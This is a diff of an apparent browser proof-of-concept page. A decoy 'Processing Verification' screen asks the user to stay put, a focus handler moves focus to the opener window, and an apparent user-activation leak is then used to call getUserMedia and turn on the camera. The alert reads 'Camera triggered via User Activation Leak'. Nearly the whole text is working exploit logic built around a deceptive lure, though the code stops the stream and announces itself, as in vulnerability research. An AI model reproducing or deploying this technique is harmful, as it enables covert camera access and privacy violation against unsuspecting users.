@@ -12,31 +12,44 @@
         <h1>Processing Verification...</h1>
         <p>Stay on the previous page to complete the check.</p>
     </div>
+
     <script>
         let currentStage = 1;
+        const statusContainer = document.getElementById("status-container");
+
         function checkAndExploit() {
             const isActive = navigator.userActivation.isActive;
+            console.log("Stage:", currentStage, "| isActive:", isActive);
 
             if (currentStage === 1) {
-                if (window.opener) window.opener.focus();
-                currentStage = 2;
-            }
-else if (currentStage === 2 && isActive) {
-    statusContainer.innerHTML = "<h1>Triggering Media...</h1>";
-    
-    navigator.mediaDevices.getUserMedia({ video: true })
-        .then((stream) => {
-            console.log("[SUCCESS] Activation leak used to trigger camera.");
-            stream.getTracks().forEach(track => track.stop());
-            alert("Vulnerability Confirmed: Camera triggered via User Activation Leak.");
-        })
-        .catch((err) => {
-            console.log("API Triggered, Result: " + err.name);
-        });
-}
-        }
+                if (window.opener) {
+                    window.opener.focus();
+                }
+                setTimeout(() => {
+                    currentStage = 2;
+                }, 100);
 
+            } else if (currentStage === 2 && isActive) {
+
+                statusContainer.innerHTML = "<h1>Triggering Media...</h1>";
+
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then((stream) => {
+                        console.log("[SUCCESS] Activation leak used to trigger camera.");
+
+                        stream.getTracks().forEach(track => track.stop());
+
+                        alert("Vulnerability Confirmed: Camera triggered via User Activation Leak.");
+                    })
+                    .catch((err) => {
+                        console.log("API Triggered, Result:", err.name);
+                    });
+
+                currentStage = 999;
+            }
+        }
         window.addEventListener("focus", checkAndExploit);
+        document.addEventListener("visibilitychange", checkAndExploit);
     </script>
 </body>
 
